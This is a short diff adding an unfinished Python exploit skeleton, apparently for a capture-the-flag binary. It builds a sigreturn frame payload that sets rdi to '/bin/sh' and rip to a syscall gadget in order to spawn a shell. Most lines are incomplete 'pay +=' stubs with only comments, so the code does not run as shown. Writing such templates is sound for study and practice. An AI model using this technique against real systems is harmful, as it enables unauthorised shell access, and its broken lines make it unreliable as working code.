@@ -1,0 +1,32 @@
+pay = ''
+pay += 'dummy'
+pay += p64(syscall)
+pay += p64(0) * 5	#dummy * 5(fastcall)
+pay +=	#r8			(dummy)
+pay +=	#r9			(dummy)
+pay +=	#r10		(dummy)
+pay +=	#r11		(dummy)
+pay +=	#r12		(dummy)
+pay +=	#r13		(dummy)
+pay +=	#r14		(dummy)
+pay +=	#r15		(dummy)
+pay +=	#rdi		('/bin/sh')
+pay +=	#rsi
+pay +=	#rbp		(dummy)
+pay +=	#rbx		(dummy)
+pay +=	#rdx
+pay +=	#rax
+pay +=	#rcx		(dummy)
+pay +=	#rsp		(dummy)
+pay +=	#rip		syscall
+pay +=	#eflags		(dummy)
+pay +=	#cs
+pay +=	#gs			(dummy)
+pay +=	#fs			(dummy)
+pay +=	#__pad0		(dummy)
+pay +=	#err		(dummy)
+pay +=	#trapno
+#pay +=	#oldmask	(dummy)
+#pay +=	#cr2		(dummy)
+
+
